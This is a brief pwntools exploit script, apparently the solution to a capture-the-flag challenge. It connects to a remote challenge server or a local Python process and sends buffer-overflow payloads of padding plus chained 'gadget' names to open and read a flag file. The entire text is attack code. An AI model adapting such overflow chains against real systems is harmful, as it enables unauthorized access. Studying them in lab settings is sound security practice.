from pwn import *
if len(sys.argv) > 1:
	sh=remote("128.199.104.41",29661)
else:
	sh=process("tempat_kembali_2.py")

p='a'*32
p+='gadget_1'
p+=b'flag'.ljust(8," ")
p+='vuln    '

sh.sendline(p)
p='a'*32
p+='gadget_2'
p+='r'.ljust(8," ")
p+='vuln '.ljust(8," ")

sh.sendline(p)

p='a'*32
p+='gadget_3'
p+='100'.ljust(8," ")
p+='vuln '.ljust(8," ")

sh.sendline(p)
p='a'*32
p+='get_file'
p+='100'.ljust(8," ")
p+='vuln '.ljust(8," ")

sh.sendline(p)

sh.interactive()